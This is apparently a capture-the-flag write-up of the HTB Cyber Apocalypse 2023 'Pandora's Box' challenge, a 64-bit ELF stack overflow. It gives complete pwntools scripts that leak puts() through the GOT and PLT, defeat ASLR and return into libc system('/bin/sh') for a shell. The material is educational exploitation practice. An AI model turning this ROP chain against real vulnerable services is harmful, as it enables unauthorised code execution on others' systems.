
# Return-to-libc/ret2libc -64bit ELF ASLR - HTB Cyber Apocalypse 2023 CTF Pandora's box 

Consider giving this a star if you found it helpfull

## This is my writeup for the "Pandora's Box" challange from HTB Cyber Apocalypse 2023 CTF.



After downloading the pb file we run the ```file ./pb``` command wich gives the folowing output:

![alt text](images/file.png?raw=true "File")

We can see that the pb file is a 64 bit elf file.

if we run checksec we can see that NX is enabled so no stack execution.

if we analyze the file in ghidra we can see that the main function calls 4 other functions, setup(), cls(), banner() and box. Most of them are not intresting but the box function is.

![alt text](images/ghidra.png?raw=true "File")

The Box function contains a vulnarble fgets() fucntion. but we have to make sure the first input we give it is '2'. If we run the program we also see that if we choose option 2 it asks us for a input.

If we input some random characters the program wil send a message and shut down. If we give the program an input of A's, thats really long we get an error and the program exits. This is the vulnarble fgets()

![alt text](images/segfault.png?raw=true "seg")

When we run a obj dump (```objdump ./pb -d```). we can see that the program contains no obvious win function. It does contain a box() function. So no re2win challange. but by looking at the functions in ghidra we know the program uses some functions from libc like puts(), prinf(), read() and more. So this looks like a ret2libc challange. Also it ask us for a location in the "library" so...


If we open the program in gdb we can get a better look at what is going on inside. ```gdb ./pb``` (Note: I am using geff extention for gdb). We know the second input is vulnarble so i create a cyclic pattern wiht gbd (```pattern create```) and use that to find the offset. If we copy and paste the cyclic pattern in the input end press enter tho program overflows and we can find our offset by searching fot the first 4 characters of the rsp register. (```pattern search haaa```)
![alt text](images/overflow.png?raw=true "overflow")

Because the file is a 64 bit elf the RIP address has to be a 48 bit canonical address wich means the address has to be in the range ```0x0000000000000000``` to ```0x00007FFFFFFFFFFF``` and ```0xFFFF800000000000``` to ```0xFFFFFFFFFFFFFFFF```. otherwise the address wont be able to clutter the RIP. If we input a bunch of A's we are overwriting the rip with a non-canonical address. If we however run the program with 56 A's (offset) and add a 6 bytes canonial address of 6 B's ```0x0000424242424242``` to the end we can see we can control the RIP.

The ret-to-libc technique is similar to the standard stack overflow attack with one important distinction: instead of overwriting the return address of the vulnerable function with the address of the shellcode, the return address is going to point to a function in the libc library like system(), so we can execute shell code that is stored in the regestry as arguments.

before we can point to system its important to know if ASLR (Address Space Layout Randomisation) is enabled. For that we can run the ```ldd ./pb``` function twice and compare the address of libc. When we do this we can see that the adress dont match so ASLR is enabled and this means we have to leak the adress of libc first before we can find system() in libc.

![alt text](images/ldd.png?raw=true "ldd")

to leak the adress we first need to find out the adress of a libc function in both the GOT and the PLT, we can use ghidra for this part again. With ghidra we can select the .got and .plt sections in the program trees. Here we have to find the addresses of a libc funciton in both. In this case I used puts().

![alt text](images/got.png?raw=true "got")

after that we we need to find a "pop rdi, ret" gadget adress with ```ropper -f ./pb | grep rdi```and combine this with the adress of got and plt puts() to leak the addres of puts() in libc and from there we can caluclate the base adress of libc. I made a python script to do this using pwntools.

```
from pwn import *
from time import sleep
import sys

r =gdb.debug('./pb', '''

        c
''')


r    = remote(IP, PORT)
exe = './pb'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
rop = ROP(elf)








rop.raw("A" * 56) # paddding
rop.raw(0x000000000040142b) # pop rdi
rop.raw(0x00403fa0) # got_put
rop.raw(0x00401030) # plt_put
rop.raw(0x0000000000401016) #ret for stack aligment
rop.raw(0x00000000004013be) #adress in main that does not result in SIGEV

#wait for first read and select option 2
r.recvuntil(b">>") 
r.sendline(b'2')
#wait for second read and send payload
r.recvuntil(b'Insert location of the library: ')
r.sendline(rop.chain())
#reading unimportant bytes
r.recvuntil(b'!\x0a\x0a')
#reading leaked address 
leak = unpack(r.recv()[:6].ljust(8, b"\x00"))

print("Leaked puts:" + str(hex(leak)))

```
The payload consist of a padding, then the pop rdi gadget, adress of puts in got, adress of plt in puts, a ret gadget wich is just a ret instruction to do some stack alligments and not get SIGBUS or SIGEV (```ropper -f ./pb | grep ret```) and lastly an adress in main. I used the call to box() adress in main because returining to main directly seem to result in stack alligment issues. we can find this adress by using ```objdump ./pb -d``` and looking for the main function.

![alt text](images/calbox.png?raw=true "calbox")

After that sending the payload the code returns a lot of bytes most of them being the banner of box() but the last few bytes are the adress of puts() in libc. now we cam just calculate the base adress of libc.

we can do this by finding the offset of puts() in the ./glibc/libc.so.6. while we are finding these ofsets we also need to find the offset of system and a shellcommand so we can use that as argument for system().

we can find the offsets with ```objdump ./glibc/libc.so.6 -d | grep puts``` and  ```objdump ./glibc/libc.so.6 -d | grep system```

![alt text](images/putsinc.png?raw=true "putsinc")

the addres off the ```/bin/sh``` we can find by using ```strings -a -t x ./glibc/libc.so.6 |grep /bin/sh```


from there we just have to calculate the base adress, create our rop chain and retrive a shell.


Here is the rest of the python script using pwn tools to handle the program localy or remotly.

```

from pwn import *
from time import sleep
import sys 


# IP   = '104.248.169.117' 
# PORT = 31796
#r    = remote(IP, PORT)

r =gdb.debug('./pb', '''

        c
''')


exe = './pb'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
rop = ROP(elf)








rop.raw("A" * 56) # paddding
rop.raw(0x000000000040142b) # pop rdi
rop.raw(0x00403fa0) # got_put
rop.raw(0x00401030) # plt_put
rop.raw(0x0000000000401016) #ret for stack aligment
rop.raw(0x00000000004013be) #adress in main that does not result in SIGEV

#wait for first read and select option 2
r.recvuntil(b">>") 
r.sendline(b'2')
#wait for second read and send payload
r.recvuntil(b'Insert location of the library: ')
r.sendline(rop.chain())
#reading unimportant bytes
r.recvuntil(b'!\x0a\x0a')
#reading leaked address 
leak = unpack(r.recv()[:6].ljust(8, b"\x00"))

print("Leaked puts:" + str(hex(leak)))
rop2 = ROP(elf)
# second part - use leaked address to preform ret2libc
libc_puts = 0x080ed0 
libc_sys  = 0x050d60
libc_sh = 0x1d8698

offset = leak - libc_puts
sys = offset + libc_sys
sh = offset + libc_sh

log.info("Going again:\n")
rop2.raw("A" * 56)
rop2.raw(0x000000000040142b) #pop rdi
rop2.raw(sh) # addres of bin/sh
rop2.raw(0x0000000000401016) #ret stack alligment
rop2.raw(sys)# adress of system


#selecting option 2
r.send(b'2')
r.recvuntil(b'Insert location of the library: ')
#sending payload
r.sendline(rop2.chain())
#SHELL!
r.interactive()

```
![alt text](images/shell.png?raw=true "shell")

I hope this helped you out,
Thanks for reading, Suggestions & Feedback are appreciated !